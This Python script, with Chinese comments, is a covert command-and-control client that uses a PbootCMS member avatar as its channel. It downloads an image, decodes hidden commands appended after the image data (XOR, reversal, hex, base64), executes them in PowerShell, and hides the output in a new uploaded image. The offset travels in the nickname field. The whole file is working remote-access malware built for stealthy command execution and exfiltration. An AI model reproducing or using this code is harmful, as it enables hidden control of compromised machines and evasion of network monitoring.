import subprocess
import base64
import json,httpx,shutil,os
from lxml import etree

class Client:
    def __init__(self,domain,PHPSESSID,key,passwd) -> None:
        self.domain = domain
        self.PHPSESSID = PHPSESSID
        self.key = key
        self.passwd = passwd

    # 使用powerhsell执行命令
    def bash_powershell(self,powershell_command):
        print(powershell_command)
        try:
            result = subprocess.run(["powershell", "-Command", powershell_command], capture_output=True, text=True)
            if result.returncode == 0:
                output = result.stdout
                error = None
            else:
                output = None
                error = result.stderr
        except Exception as e:
            output = None
            error = str(e)
        if output !=None:
            return output
        else:
            return error
    
    # 获取图片地址
    def get_tp(self):
        url = self.domain+"/?member/ucenter/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Cookie": "PbootSystem={}".format(self.PHPSESSID),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
        }
        with httpx.Client() as client:
            response = client.get(url, headers=headers)
        data = etree.HTML(response.text)
        str = data.xpath('/html/body/div[3]/div[2]/div[3]/table/tbody/tr[4]/td[2]/img/@src')
        psize = data.xpath('/html/body/div[3]/div[2]/div[3]/table/tbody/tr[5]/td[2]/text()')[0]
        dz = str[0]
        return dz,psize
    
    # 发送数据
    def send_img(self,file_path):
        url = self.domain+"/?member/upload/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "X-Requested-With": "XMLHttpRequest",
            "Cookie": "PbootSystem={}".format(self.PHPSESSID), 
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
        }
        filename = file_path.split('/')[-1]
        data = {
            "upload": (filename, open(file_path, "rb"), "image/jpg"),
        }
        with httpx.Client() as client:
            response = client.post(url, headers=headers, files=data)
        fh = response.text
        js_fh =json.loads(fh)
        pl = js_fh["data"][0]
        return pl

    # 数据植入图片
    def inject_img(self,img,txt,req):
        # 复制图片到相应的目录
        shutil.copyfile(img, req)
        tp = req
        # 将txt转化成十六进制
        binary_txt = self.string_to_hex_format(txt)
        # 进行简单的反转异或and base64
        binary_txt = self.reverse_string(binary_txt)
        binary_txt = self.xor_encrypt(binary_txt)
        binary_txt=binary_txt.encode()
        binary_txt = base64.b64encode(binary_txt)
        # 将数据注入到图片里面去
        psize = os.path.getsize(tp)
        f = open(tp,'ab+')
        f.seek(psize)
        f.write(binary_txt)
        newsize = os.path.getsize(tp)
        if newsize>psize or newsize==psize:
            return psize,tp
        else:
            return 0,tp

    # 文本转十六进制
    def string_to_hex_format(self,input_string):
        hex_representation = "".join([hex(ord(char))[2:] for char in input_string])
        return hex_representation

    # 十六转文本
    def hex_format_to_string(self,hex_format):
        hex_data = hex_format
        text_data = "".join([chr(int(hex_data[i:i+2], 16)) for i in range(0, len(hex_data), 2)])
        return text_data
    
    # 反转
    def reverse_string(self,input_string):
        return input_string[::-1]
    
    # xor
    def xor_encrypt(self,input_str):
        bytes_input = input_str.encode()
        repeated_key = (self.key * (len(input_str) // len(self.key))) + self.key[:len(input_str) % len(self.key)]
        bytes_repeated_key = repeated_key.encode()
        result_bytes = bytes(x ^ y for x, y in zip(bytes_input, bytes_repeated_key))
        result_str = result_bytes.decode()
        return result_str
    
    # 获取图片，进行解密
    def get_tp_jm(self,tp_lj,psize):
        # 首先获取图片，并保存
        url = self.domain+tp_lj
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
        }
        file = httpx.get(url=url,headers=headers).content
        data_after_position = file[int(psize):]
        encrypted_data = base64.b64decode(data_after_position)
        encrypted_data = encrypted_data.decode() 
        decrypted_result = self.xor_encrypt(encrypted_data)
        decrypted_result = self.reverse_string(decrypted_result)
        decrypted_result = self.hex_format_to_string(decrypted_result)
        return decrypted_result

    # 发送偏移量
    def sed_pyl(self,psize,ptpath):
        url = self.domain+"/?member/umodify/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "PbootSystem={}".format(self.PHPSESSID),
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
        }
        data = {
            "headpic": ptpath,
            "useremail": "",
            "usermobile": "",
            "nickname": "{}".format(psize),
            "password": "",
            "rpassword": "",
            "sex": "男",
            "birthday": "",
            "qq": "",
            "opassword": self.passwd,
        }
        with httpx.Client() as client:
            response = client.post(url, headers=headers, data=data)
        ll = response.text
        if "修改成" in ll:
            return 1
        else:
            return 0

def suansuan(domain,PHPSESSID,key,passwd):
    app_client= Client(domain,PHPSESSID,key,passwd)
    pd = ''
    while True:
        while True:
            ttp = app_client.get_tp()
            ps = ttp[1]
            dz1 = ttp[0]
            if dz1 != pd:
                pd = dz1
                break
        # 这里相当于得到了图片命令
        # 进行解密
        mw  = app_client.get_tp_jm(dz1,ps)
        # 执行命令：
        jg = app_client.bash_powershell(mw)
        jg=jg.encode()
        jg = base64.b64encode(jg)
        jg=jg.decode()
        # 发送数据
        pp = app_client.inject_img('v.png',jg,"client/v.png")
        path = pp[1]
        ps1  = pp[0]
        # 发送图片
        new_path = app_client.send_img(path)
        new_path = new_path.replace('\\','')
        # 发送偏移量
        app_client.sed_pyl(ps1,new_path)
        pd = new_path

suansuan("http://127.0.0.1:88","4alq0oq5tup61soak268civ9ae","suanpro","admin")